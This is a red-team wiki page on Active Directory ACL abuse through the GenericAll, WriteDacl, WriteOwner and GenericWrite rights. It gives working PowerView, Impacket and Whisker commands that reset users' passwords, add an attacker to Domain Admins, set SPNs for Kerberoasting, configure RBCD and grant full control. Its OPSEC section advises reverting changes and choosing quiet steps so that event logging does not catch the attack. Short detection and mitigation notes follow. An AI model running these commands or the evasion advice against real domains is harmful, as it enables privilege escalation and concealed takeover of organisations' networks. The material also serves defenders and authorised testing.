---
title: ACL/ACE Abuse (Object Control)
type: concept
created: 2026-06-13
updated: 2026-09-07
tags: [active-directory, privilege-escalation, bloodhound]
---

# ACL/ACE Abuse (Object Control)

Active Directory authorizes operations on objects (users, groups,
computers, GPOs, the domain head, certificate templates, etc.) via ACLs
made up of ACEs. "Object control" abuse is leveraging an excessive ACE an
attacker-controlled principal holds over a target object to escalate or
pivot. These edges are the backbone of BloodHound attack-path analysis.

## Core abusable rights

### GenericAll (Full Control)
- **User target**: reset password (no old password needed), or set
  `servicePrincipalName` for targeted [[kerberoasting]].
- **Group target**: add any principal (including yourself) as a member.
- **Computer target**: write `msDS-AllowedToActOnBehalfOfOtherIdentity` for
  [[kerberos-delegation-abuse|RBCD]], or read the LAPS password attribute.

### WriteDacl
Lets the holder modify the object's security descriptor — grant themselves
`GenericAll` (or any other right) over the target, then proceed as above.

### WriteOwner
Lets the holder take ownership of the object. The owner implicitly gets
`WriteDacl`-equivalent rights, so the chain is: take ownership → grant self
`WriteDacl` → grant self `GenericAll` → abuse as above.

### GenericWrite / WriteProperty
Write access to specific attributes, most commonly targeted:
- `msDS-AllowedToActOnBehalfOfOtherIdentity` → [[kerberos-delegation-abuse|RBCD]]
- `member` → group membership
- `servicePrincipalName` → targeted [[kerberoasting]]
- `msDS-KeyCredentialLink` → [[shadow-credentials]] (passwordless takeover + NT hash recovery)
- GPO objects (`GenericWrite`/`WriteDacl`/`WriteOwner`) → [[gpo-abuse]]

## Commands

```powershell
# --- Enumeration ---
# Find interesting ACEs held by your principal (or a group you're in)
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (ConvertTo-SID "CORP\attacker")}

# Find who has rights over a specific target object
Get-DomainObjectAcl -Identity "TargetObject" -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty"}

# Or just load it all into BloodHound (SharpHound collector) and use the
# Cypher "shortest path to Domain Admins" queries.
```

```powershell
# --- GenericAll on a user: reset password / set SPN ---
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/whatever'}   # then Kerberoast it, see [[kerberoasting]]

# --- GenericAll on a group: add yourself ---
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# --- GenericAll/GenericWrite on a computer: RBCD ---
$ComputerSid = Get-DomainComputer attacker-controlled-computer -Properties objectsid | Select -Expand objectsid
$SD = New-ADServiceAccountResourceDelegationSD -Sid $ComputerSid   # or use Set-ADComputer -PrincipalsAllowedToDelegateToAccount
Set-DomainObject -Identity TargetComputer -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SD}
```

```bash
# --- WriteDacl / WriteOwner -> grant self GenericAll (Impacket dacledit, Linux) ---
# Take ownership first if needed
owneredit.py -action write -new-owner attacker -target TargetObject 'DOMAIN/attacker:password'

# Grant self full control via the ACL
dacledit.py -action write -rights FullControl -principal attacker -target TargetObject 'DOMAIN/attacker:password'
```

```powershell
# --- WriteDacl / WriteOwner (PowerView) ---
Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity attacker -Rights All

# --- msDS-KeyCredentialLink (GenericWrite) -> Shadow Credentials, see [[shadow-credentials]] ---
Whisker.exe add /target:TargetObject
```

## Prerequisites

- An attacker-controlled principal holds one of the above ACEs over a
  target object.
- A *path* of such ACEs exists from current context to a high-value object
  (Domain Admin, a Tier-0 group, a GPO linked to a sensitive OU, etc.) —
  this is exactly what BloodHound's edge graph visualizes.

## Red-team notes (OPSEC)

- **Let the graph pick the edge.** Read the shortest path in [[bloodhound]],
  make the *single* ACE/attribute change it calls for, then abuse it — don't
  enumerate-and-poke object by object.
- **Make it, use it, revert it.** ACL/attribute writes fire 4670 (DACL) and
  5136 (attribute); the change is rare and high-fidelity, so put the ACL back
  the moment you've used it (add-then-remove group membership, clear the SPN,
  restore the owner).
- **Prefer the quiet primitive** the edge offers: a targeted SPN write +
  [[kerberoasting]] leaves less than a password reset (which locks the real
  user out and is immediately noticed).
- **Run remotely.** `dacledit.py` / `owneredit.py` / `addcomputer.py`
  (Impacket) from Linux over the tunnel; PowerView (`Add-DomainObjectAcl`,
  `Set-DomainObjectOwner`) on-host from memory.
- **Watch AdminSDHolder.** Changes to protected (Tier-0) objects get reverted
  by SDProp within ~60 min — time abuse of those accordingly, or pivot via
  AdminSDHolder itself for persistence ([[ad-persistence]]).

## Detection

- **Event 4670** — permissions on an object were changed (high-fidelity for
  `WriteDacl` abuse).
- **Event 5136** — directory object modified; watch for changes to
  `member`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`,
  and certificate template security descriptors (see [[ad-cs-esc-attacks]]
  ESC4).

## Mitigations

- Least privilege on object ACLs; regular BloodHound/Sharphound sweeps to
  find and remediate unintended paths.
- [[ad-tiering-and-hardening|AD tiering]] — prevents low-tier principals
  from ever holding control edges to Tier-0 objects.
- Understand and audit `AdminSDHolder` — it periodically re-stamps ACLs on
  protected (Tier-0) groups/accounts, which both protects them and is itself
  a target for persistence if compromised.

## Links

- [[kerberos-delegation-abuse]] — RBCD is the canonical "write one attribute,
  own the box" GenericWrite/GenericAll abuse
- [[ad-cs-esc-attacks]] — ESC4 is WriteDacl/WriteOwner/WriteProperty over a
  certificate template, the AD CS-specific case of this same primitive
- [[kerberoasting]] — targeted kerberoasting via SPN write
- [[ad-tiering-and-hardening]] — primary structural mitigation
- [[powerupack]] — PowerShell toolkit that exploits these ACL edges

## References

- [BloodHound Documentation: Object Control Edges](https://bloodhound.specterops.io/resources/edges/genericall)
- [ired.team: ACL Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls)
- [SpecterOps: Access Control Attack Patterns](https://posts.specterops.io/access-control-attack-patterns-d890494f6f7b)
</content>
